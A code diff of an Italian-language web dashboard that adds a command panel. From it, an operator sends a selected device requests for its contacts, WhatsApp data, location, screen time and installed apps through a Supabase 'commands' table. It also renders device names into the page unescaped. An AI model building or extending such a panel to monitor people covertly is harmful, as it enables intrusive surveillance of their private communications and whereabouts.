@@ -13,12 +13,28 @@
         .container { max-width: 1200px; margin: 0 auto; padding: 0 1rem; }
         .card { background: white; border-radius: 0.5rem; box-shadow: 0 1px 3px rgba(0,0,0,0.1); padding: 1.5rem; margin-bottom: 1.5rem; }
         .card h2 { font-size: 1.25rem; font-weight: 600; margin-bottom: 1rem; }
-        .device-item { padding: 1rem; background: #f9fafb; border-radius: 0.375rem; margin-bottom: 0.5rem; border-left: 4px solid #2563eb; }
+        .device-item { padding: 1rem; background: #f9fafb; border-radius: 0.375rem; margin-bottom: 0.5rem; border-left: 4px solid #2563eb; cursor: pointer; transition: all 0.2s; }
+        .device-item:hover { background: #e5e7eb; }
+        .device-item.active { background: #dbeafe; border-left-color: #0284c7; }
         .device-name { font-weight: 600; font-size: 0.875rem; }
         .device-status { font-size: 0.75rem; color: #6b7280; margin-top: 0.25rem; }
         .loading { color: #6b7280; font-style: italic; }
         .error { color: #dc2626; }
+        .btn { padding: 0.5rem 1rem; border: none; border-radius: 0.375rem; cursor: pointer; font-weight: 500; margin-right: 0.5rem; margin-bottom: 0.5rem; transition: all 0.2s; }
+        .btn-primary { background: #2563eb; color: white; }
+        .btn-primary:hover { background: #1d4ed8; }
+        .btn-success { background: #16a34a; color: white; }
+        .btn-success:hover { background: #15803d; }
+        .btn-warning { background: #ea580c; color: white; }
+        .btn-warning:hover { background: #c2410c; }
+        .btn-danger { background: #dc2626; color: white; }
+        .btn-danger:hover { background: #b91c1c; }
+        .btn:disabled { opacity: 0.5; cursor: not-allowed; }
+        .commands-section { display: none; }
+        .commands-section.active { display: block; }
         ul { list-style: none; }
+        .grid { display: grid; grid-template-columns: 1fr 1fr; gap: 1.5rem; }
+        @media (max-width: 768px) { .grid { grid-template-columns: 1fr; } }
     </style>
 </head>
 <body>
@@ -30,22 +46,40 @@
     </header>
 
     <div class="container">
-        <div class="card">
-            <h2>📱 Dispositivi Connessi</h2>
-            <ul id="devicesList">
-                <li class="loading">Caricamento...</li>
-            </ul>
+        <div class="grid">
+            <div class="card">
+                <h2>📱 Dispositivi Connessi</h2>
+                <ul id="devicesList">
+                    <li class="loading">Caricamento...</li>
+                </ul>
+            </div>
+
+            <div class="card">
+                <h2>📊 Statistiche</h2>
+                <div style="background: #f0f9ff; padding: 1rem; border-radius: 0.375rem; margin-bottom: 0.5rem;">
+                    <div style="font-size: 0.875rem; color: #6b7280;">Dispositivi Online</div>
+                    <div style="font-size: 1.875rem; font-weight: bold; margin-top: 0.5rem;" id="onlineCount">0</div>
+                </div>
+                <div style="background: #f0f9ff; padding: 1rem; border-radius: 0.375rem;">
+                    <div style="font-size: 0.875rem; color: #6b7280;">Ultimo Aggiornamento</div>
+                    <div style="font-size: 0.875rem; margin-top: 0.5rem;" id="lastUpdate">-</div>
+                </div>
+            </div>
         </div>
 
-        <div class="card">
-            <h2>📊 Statistiche</h2>
-            <div style="background: #f0f9ff; padding: 1rem; border-radius: 0.375rem; margin-bottom: 0.5rem;">
-                <div style="font-size: 0.875rem; color: #6b7280;">Dispositivi Online</div>
-                <div style="font-size: 1.875rem; font-weight: bold; margin-top: 0.5rem;" id="onlineCount">0</div>
-            </div>
-            <div style="background: #f0f9ff; padding: 1rem; border-radius: 0.375rem;">
-                <div style="font-size: 0.875rem; color: #6b7280;">Ultimo Aggiornamento</div>
-                <div style="font-size: 0.875rem; margin-top: 0.5rem;" id="lastUpdate">-</div>
+        <div class="card commands-section" id="commandsSection">
+            <h2>⚡ Comandi On-Demand</h2>
+            <p style="color: #6b7280; margin-bottom: 1rem; font-size: 0.875rem;">Seleziona un dispositivo per inviare comandi</p>
+            
+            <div style="display: grid; grid-template-columns: repeat(auto-fit, minmax(150px, 1fr)); gap: 0.5rem;">
+                <button class="btn btn-primary" onclick="sendCommand('get_device_info')">📱 Info Dispositivo</button>
+                <button class="btn btn-success" onclick="sendCommand('get_apps')">📲 App Aperte</button>
+                <button class="btn btn-warning" onclick="sendCommand('get_battery')">🔋 Batteria</button>
+                <button class="btn btn-primary" onclick="sendCommand('get_contacts')">📞 Contatti</button>
+                <button class="btn btn-success" onclick="sendCommand('get_whatsapp')">💬 WhatsApp</button>
+                <button class="btn btn-warning" onclick="sendCommand('get_location')">📍 Posizione</button>
+                <button class="btn btn-primary" onclick="sendCommand('get_screen_time')">⏱️ Tempo Schermo</button>
+                <button class="btn btn-danger" onclick="sendCommand('get_installed_apps')">📦 App Installate</button>
             </div>
         </div>
     </div>
@@ -57,6 +91,7 @@
 
         const sbClient = window.supabase.createClient(SUPABASE_URL, SUPABASE_KEY);
         let devices = [];
+        let selectedDevice = null;
 
         async function loadDevices() {
             try {
@@ -83,7 +118,7 @@
             }
 
             list.innerHTML = devices.map(device => `
-                <li class="device-item">
+                <li class="device-item ${selectedDevice?.id === device.id ? 'active' : ''}" onclick="selectDevice('${device.id}')">
                     <div class="device-name">${device.name}</div>
                     <div class="device-status">
                         ${device.status === 'online' ? '🟢 Online' : '🔴 Offline'}
@@ -99,6 +134,36 @@
             document.getElementById('lastUpdate').textContent = lastSeen 
                 ? lastSeen.toLocaleString('it-IT')
                 : '-';
+        }
+
+        function selectDevice(deviceId) {
+            selectedDevice = devices.find(d => d.id === deviceId);
+            renderDevices();
+            document.getElementById('commandsSection').classList.add('active');
+        }
+
+        async function sendCommand(command) {
+            if (!selectedDevice) {
+                alert('Seleziona un dispositivo!');
+                return;
+            }
+
+            try {
+                const { error } = await sbClient
+                    .from('commands')
+                    .insert([{
+                        device_id: selectedDevice.id,
+                        command: command,
+                        params: {},
+                        status: 'pending'
+                    }]);
+
+                if (error) throw error;
+                alert(`✅ Comando "${command}" inviato!`);
+            } catch (error) {
+                alert('❌ Errore nell\'invio del comando');
+                console.error(error);
+            }
         }
 
         loadDevices();
